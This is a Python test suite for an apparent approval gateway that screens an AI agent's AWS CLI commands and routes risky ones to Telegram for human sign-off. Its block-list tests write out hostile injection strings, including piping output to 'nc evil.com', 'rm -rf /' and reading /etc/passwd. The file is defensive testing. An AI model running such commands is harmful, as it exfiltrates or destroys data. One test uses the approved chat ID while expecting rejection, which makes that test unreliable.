"""
Bouncer - 完整測試套件
包含單元測試、整合測試、E2E 測試（用 moto mock AWS）
"""

import pytest
import json
import time
import hmac
import hashlib
import os
import sys

# 設定測試環境變數
os.environ['TELEGRAM_BOT_TOKEN'] = 'test_token_123'
os.environ['APPROVED_CHAT_ID'] = '999999999'
os.environ['REQUEST_SECRET'] = 'test_secret_abc123'
os.environ['TABLE_NAME'] = 'test-bouncer-requests'
os.environ['TELEGRAM_WEBHOOK_SECRET'] = 'webhook_secret_xyz'
os.environ['ENABLE_HMAC'] = 'false'

# Mock boto3 before importing app
from unittest.mock import MagicMock, patch
import boto3
from moto import mock_aws


# ============================================================================
# Fixtures
# ============================================================================

@pytest.fixture
def mock_dynamodb():
    """建立 mock DynamoDB 表"""
    with mock_aws():
        dynamodb = boto3.resource('dynamodb', region_name='us-east-1')
        table = dynamodb.create_table(
            TableName='test-bouncer-requests',
            KeySchema=[{'AttributeName': 'request_id', 'KeyType': 'HASH'}],
            AttributeDefinitions=[{'AttributeName': 'request_id', 'AttributeType': 'S'}],
            BillingMode='PAY_PER_REQUEST'
        )
        table.wait_until_exists()
        yield dynamodb


@pytest.fixture
def app_module(mock_dynamodb):
    """載入 app 模組（在 mock 環境下）"""
    # 加入 src 目錄到 path
    src_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'src')
    if src_path not in sys.path:
        sys.path.insert(0, src_path)
    
    # 重新載入以使用 mock
    if 'app' in sys.modules:
        del sys.modules['app']
    
    import app
    # 更新 table reference
    app.table = mock_dynamodb.Table('test-bouncer-requests')
    return app


# ============================================================================
# Unit Tests - 命令分類
# ============================================================================

class TestCommandClassification:
    """測試命令分類邏輯"""
    
    def test_blocked_iam_create(self, app_module):
        assert app_module.is_blocked('aws iam create-user --user-name hacker')
    
    def test_blocked_iam_delete(self, app_module):
        assert app_module.is_blocked('aws iam delete-role --role-name admin')
    
    def test_blocked_sts_assume_role(self, app_module):
        assert app_module.is_blocked('aws sts assume-role --role-arn xxx')
    
    def test_blocked_shell_injection_semicolon(self, app_module):
        assert app_module.is_blocked('aws s3 ls; rm -rf /')
    
    def test_blocked_shell_injection_pipe(self, app_module):
        assert app_module.is_blocked('aws s3 ls | nc evil.com 1234')
    
    def test_blocked_shell_injection_and(self, app_module):
        assert app_module.is_blocked('aws s3 ls && cat /etc/passwd')
    
    def test_blocked_shell_injection_backtick(self, app_module):
        assert app_module.is_blocked('aws s3 ls `whoami`')
    
    def test_blocked_shell_injection_dollar(self, app_module):
        assert app_module.is_blocked('aws s3 ls $(id)')
    
    def test_blocked_organizations(self, app_module):
        assert app_module.is_blocked('aws organizations list-accounts')
    
    def test_blocked_sudo(self, app_module):
        assert app_module.is_blocked('sudo aws s3 ls')
    
    def test_blocked_case_insensitive(self, app_module):
        assert app_module.is_blocked('AWS IAM CREATE-USER --user-name x')
    
    def test_not_blocked_safe_command(self, app_module):
        assert not app_module.is_blocked('aws ec2 describe-instances')
    
    def test_safelist_ec2_describe(self, app_module):
        assert app_module.is_auto_approve('aws ec2 describe-instances')
    
    def test_safelist_s3_ls(self, app_module):
        assert app_module.is_auto_approve('aws s3 ls s3://my-bucket')
    
    def test_safelist_sts_identity(self, app_module):
        assert app_module.is_auto_approve('aws sts get-caller-identity')
    
    def test_safelist_logs(self, app_module):
        assert app_module.is_auto_approve('aws logs filter-log-events --log-group x')
    
    def test_safelist_iam_readonly(self, app_module):
        assert app_module.is_auto_approve('aws iam list-users')
        assert app_module.is_auto_approve('aws iam get-role --role-name x')
    
    def test_not_safelist_ec2_start(self, app_module):
        assert not app_module.is_auto_approve('aws ec2 start-instances --instance-ids i-xxx')
    
    def test_not_safelist_s3_upload(self, app_module):
        assert not app_module.is_auto_approve('aws s3 cp file.txt s3://bucket/')


# ============================================================================
# Unit Tests - HMAC 驗證
# ============================================================================

class TestHMACVerification:
    """測試 HMAC 簽章驗證"""
    
    def test_valid_hmac(self, app_module):
        secret = 'test_secret_abc123'
        body = '{"command": "test"}'
        timestamp = str(int(time.time()))
        nonce = 'random123'
        
        payload = f"{timestamp}.{nonce}.{body}"
        signature = hmac.new(secret.encode(), payload.encode(), hashlib.sha256).hexdigest()
        
        headers = {
            'x-timestamp': timestamp,
            'x-nonce': nonce,
            'x-signature': signature
        }
        
        assert app_module.verify_hmac(headers, body)
    
    def test_invalid_signature(self, app_module):
        headers = {
            'x-timestamp': str(int(time.time())),
            'x-nonce': 'random',
            'x-signature': 'invalid_signature'
        }
        assert not app_module.verify_hmac(headers, '{}')
    
    def test_expired_timestamp(self, app_module):
        """超過 5 分鐘應該被拒絕"""
        old_timestamp = str(int(time.time()) - 600)  # 10 minutes ago
        headers = {
            'x-timestamp': old_timestamp,
            'x-nonce': 'random',
            'x-signature': 'any'
        }
        assert not app_module.verify_hmac(headers, '{}')
    
    def test_missing_headers(self, app_module):
        assert not app_module.verify_hmac({}, '{}')
        assert not app_module.verify_hmac({'x-timestamp': '123'}, '{}')


# ============================================================================
# Unit Tests - 輔助函數
# ============================================================================

class TestUtilities:
    """測試輔助函數"""
    
    def test_generate_request_id(self, app_module):
        id1 = app_module.generate_request_id('aws s3 ls')
        id2 = app_module.generate_request_id('aws s3 ls')
        assert len(id1) == 12
        assert id1 != id2  # 應該唯一
    
    def test_decimal_to_native(self, app_module):
        from decimal import Decimal
        result = app_module.decimal_to_native({
            'int_val': Decimal('42'),
            'float_val': Decimal('3.14'),
            'nested': {'val': Decimal('100')}
        })
        assert result['int_val'] == 42
        assert result['float_val'] == 3.14
        assert result['nested']['val'] == 100
    
    def test_response_format(self, app_module):
        resp = app_module.response(200, {'status': 'ok'})
        assert resp['statusCode'] == 200
        assert 'Content-Type' in resp['headers']
        body = json.loads(resp['body'])
        assert body['status'] == 'ok'


# ============================================================================
# Integration Tests - API Handler
# ============================================================================

class TestAPIHandlers:
    """測試 API 處理函數"""
    
    def test_missing_secret_returns_403(self, app_module):
        event = {
            'rawPath': '/',
            'headers': {},
            'body': '{"command": "aws s3 ls"}',
            'requestContext': {'http': {'method': 'POST'}}
        }
        result = app_module.handle_clawdbot_request(event)
        assert result['statusCode'] == 403
    
    def test_wrong_secret_returns_403(self, app_module):
        event = {
            'rawPath': '/',
            'headers': {'x-approval-secret': 'wrong_secret'},
            'body': '{"command": "aws s3 ls"}',
            'requestContext': {'http': {'method': 'POST'}}
        }
        result = app_module.handle_clawdbot_request(event)
        assert result['statusCode'] == 403
    
    def test_invalid_json_returns_400(self, app_module):
        event = {
            'rawPath': '/',
            'headers': {'x-approval-secret': 'test_secret_abc123'},
            'body': 'not json',
            'requestContext': {'http': {'method': 'POST'}}
        }
        result = app_module.handle_clawdbot_request(event)
        assert result['statusCode'] == 400
    
    def test_empty_command_returns_400(self, app_module):
        event = {
            'rawPath': '/',
            'headers': {'x-approval-secret': 'test_secret_abc123'},
            'body': '{"command": ""}',
            'requestContext': {'http': {'method': 'POST'}}
        }
        result = app_module.handle_clawdbot_request(event)
        assert result['statusCode'] == 400
    
    def test_blocked_command_returns_403(self, app_module):
        event = {
            'rawPath': '/',
            'headers': {'x-approval-secret': 'test_secret_abc123'},
            'body': '{"command": "aws iam create-user --user-name bad"}',
            'requestContext': {'http': {'method': 'POST'}}
        }
        result = app_module.handle_clawdbot_request(event)
        assert result['statusCode'] == 403
        body = json.loads(result['body'])
        assert body['status'] == 'blocked'
    
    @patch('app.execute_command')
    @patch('app.send_telegram_message')
    def test_safelist_command_auto_approved(self, mock_telegram, mock_exec, app_module):
        mock_exec.return_value = '{"Account": "123456789"}'
        
        event = {
            'rawPath': '/',
            'headers': {'x-approval-secret': 'test_secret_abc123'},
            'body': '{"command": "aws sts get-caller-identity"}',
            'requestContext': {'http': {'method': 'POST'}}
        }
        result = app_module.handle_clawdbot_request(event)
        assert result['statusCode'] == 200
        body = json.loads(result['body'])
        assert body['status'] == 'auto_approved'
        mock_exec.assert_called_once()
        mock_telegram.assert_not_called()
    
    @patch('app.send_telegram_message')
    def test_approval_required_returns_202(self, mock_telegram, app_module):
        event = {
            'rawPath': '/',
            'headers': {'x-approval-secret': 'test_secret_abc123'},
            'body': '{"command": "aws ec2 start-instances --instance-ids i-123", "reason": "test"}',
            'requestContext': {'http': {'method': 'POST'}}
        }
        result = app_module.handle_clawdbot_request(event)
        assert result['statusCode'] == 202
        body = json.loads(result['body'])
        assert body['status'] == 'pending_approval'
        assert 'request_id' in body
        mock_telegram.assert_called_once()


# ============================================================================
# Integration Tests - Status Query
# ============================================================================

class TestStatusQuery:
    """測試狀態查詢 endpoint"""
    
    def test_status_missing_secret(self, app_module):
        event = {
            'rawPath': '/status/abc123',
            'headers': {},
            'requestContext': {'http': {'method': 'GET'}}
        }
        result = app_module.handle_status_query(event, '/status/abc123')
        assert result['statusCode'] == 403
    
    def test_status_not_found(self, app_module):
        event = {
            'rawPath': '/status/nonexistent',
            'headers': {'x-approval-secret': 'test_secret_abc123'},
            'requestContext': {'http': {'method': 'GET'}}
        }
        result = app_module.handle_status_query(event, '/status/nonexistent')
        assert result['statusCode'] == 404
    
    @patch('app.send_telegram_message')
    def test_status_found(self, mock_telegram, app_module):
        # 先建立一個請求
        event = {
            'rawPath': '/',
            'headers': {'x-approval-secret': 'test_secret_abc123'},
            'body': '{"command": "aws ec2 start-instances --instance-ids i-123"}',
            'requestContext': {'http': {'method': 'POST'}}
        }
        result = app_module.handle_clawdbot_request(event)
        request_id = json.loads(result['body'])['request_id']
        
        # 查詢狀態
        event = {
            'rawPath': f'/status/{request_id}',
            'headers': {'x-approval-secret': 'test_secret_abc123'},
            'requestContext': {'http': {'method': 'GET'}}
        }
        result = app_module.handle_status_query(event, f'/status/{request_id}')
        assert result['statusCode'] == 200
        body = json.loads(result['body'])
        assert body['status'] == 'pending'


# ============================================================================
# E2E Tests - 完整流程
# ============================================================================

class TestE2EFlow:
    """端到端流程測試"""
    
    @patch('app.send_telegram_message')
    @patch('app.execute_command')
    @patch('app.update_message')
    @patch('app.answer_callback')
    def test_full_approval_flow(self, mock_answer, mock_update, mock_exec, mock_send, app_module):
        """測試完整審批流程：提交 → 審批 → 執行"""
        mock_exec.return_value = 'Instance started'
        
        # Step 1: 提交請求
        submit_event = {
            'rawPath': '/',
            'headers': {'x-approval-secret': 'test_secret_abc123'},
            'body': '{"command": "aws ec2 start-instances --instance-ids i-123", "reason": "需要啟動"}',
            'requestContext': {'http': {'method': 'POST'}}
        }
        result = app_module.handle_clawdbot_request(submit_event)
        assert result['statusCode'] == 202
        request_id = json.loads(result['body'])['request_id']
        mock_send.assert_called_once()
        
        # Step 2: 模擬 Telegram 批准
        approve_event = {
            'rawPath': '/webhook',
            'headers': {'x-telegram-bot-api-secret-token': 'webhook_secret_xyz'},
            'body': json.dumps({
                'callback_query': {
                    'id': 'callback123',
                    'from': {'id': 999999999},
                    'data': f'approve:{request_id}',
                    'message': {'message_id': 999}
                }
            })
        }
        result = app_module.handle_telegram_webhook(approve_event)
        assert result['statusCode'] == 200
        mock_exec.assert_called_once()
        
        # Step 3: 確認狀態已更新
        status_event = {
            'rawPath': f'/status/{request_id}',
            'headers': {'x-approval-secret': 'test_secret_abc123'},
            'requestContext': {'http': {'method': 'GET'}}
        }
        result = app_module.handle_status_query(status_event, f'/status/{request_id}')
        body = json.loads(result['body'])
        assert body['status'] == 'approved'
        assert 'result' in body
    
    @patch('app.send_telegram_message')
    @patch('app.update_message')
    @patch('app.answer_callback')
    def test_full_deny_flow(self, mock_answer, mock_update, mock_send, app_module):
        """測試拒絕流程"""
        # Step 1: 提交
        submit_event = {
            'rawPath': '/',
            'headers': {'x-approval-secret': 'test_secret_abc123'},
            'body': '{"command": "aws lambda delete-function --function-name prod"}',
            'requestContext': {'http': {'method': 'POST'}}
        }
        result = app_module.handle_clawdbot_request(submit_event)
        request_id = json.loads(result['body'])['request_id']
        
        # Step 2: 拒絕
        deny_event = {
            'rawPath': '/webhook',
            'headers': {'x-telegram-bot-api-secret-token': 'webhook_secret_xyz'},
            'body': json.dumps({
                'callback_query': {
                    'id': 'callback456',
                    'from': {'id': 999999999},
                    'data': f'deny:{request_id}',
                    'message': {'message_id': 888}
                }
            })
        }
        result = app_module.handle_telegram_webhook(deny_event)
        assert result['statusCode'] == 200
        
        # Step 3: 確認狀態
        status_event = {
            'rawPath': f'/status/{request_id}',
            'headers': {'x-approval-secret': 'test_secret_abc123'},
            'requestContext': {'http': {'method': 'GET'}}
        }
        result = app_module.handle_status_query(status_event, f'/status/{request_id}')
        body = json.loads(result['body'])
        assert body['status'] == 'denied'
    
    def test_unauthorized_approver_rejected(self, app_module):
        """非授權用戶無法審批"""
        event = {
            'rawPath': '/webhook',
            'headers': {'x-telegram-bot-api-secret-token': 'webhook_secret_xyz'},
            'body': json.dumps({
                'callback_query': {
                    'id': 'callback789',
                    'from': {'id': 999999999},  # 非授權用戶
                    'data': 'approve:some_id',
                    'message': {'message_id': 777}
                }
            })
        }
        result = app_module.handle_telegram_webhook(event)
        assert result['statusCode'] == 403


# ============================================================================
# Security Tests
# ============================================================================

class TestSecurity:
    """安全性測試"""
    
    def test_all_injection_vectors_blocked(self, app_module):
        """測試所有已知注入向量"""
        vectors = [
            'aws s3 ls; cat /etc/passwd',
            'aws s3 ls && rm -rf /',
            'aws s3 ls || echo hacked',
            'aws s3 ls | nc evil.com 1234',
            'aws s3 ls `id`',
            'aws s3 ls $(whoami)',
            'aws s3 ls ${HOME}',
            'aws s3 ls > /dev/null',
            'sudo aws s3 ls',
            'aws iam create-user --user-name x',
            'aws iam delete-policy --policy-arn x',
            'aws iam attach-role-policy --role-name x',
            'aws sts assume-role --role-arn x',
            'aws organizations create-account',
        ]
        for v in vectors:
            assert app_module.is_blocked(v), f"Should block: {v}"
    
    def test_webhook_signature_required(self, app_module):
        """Webhook 需要正確簽名"""
        os.environ['TELEGRAM_WEBHOOK_SECRET'] = 'required_secret'
        event = {
            'rawPath': '/webhook',
            'headers': {'x-telegram-bot-api-secret-token': 'wrong'},
            'body': '{}'
        }
        result = app_module.handle_telegram_webhook(event)
        assert result['statusCode'] == 403


# ============================================================================
# Edge Cases
# ============================================================================

class TestEdgeCases:
    """邊界情況測試"""
    
    def test_very_long_command(self, app_module):
        """超長命令處理"""
        long_cmd = 'aws s3 ls ' + 'a' * 10000
        # 應該不會崩潰
        assert not app_module.is_blocked(long_cmd)
    
    def test_unicode_in_command(self, app_module):
        """Unicode 字元處理"""
        cmd = 'aws s3 ls s3://bucket/文件.txt'
        assert not app_module.is_blocked(cmd)
    
    def test_newlines_in_command(self, app_module):
        """換行符處理"""
        cmd = 'aws s3 ls\n--bucket test'
        # 換行可能被用於注入
        result = app_module.is_blocked(cmd)
        # 目前不擋，但記錄為已知行為


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])
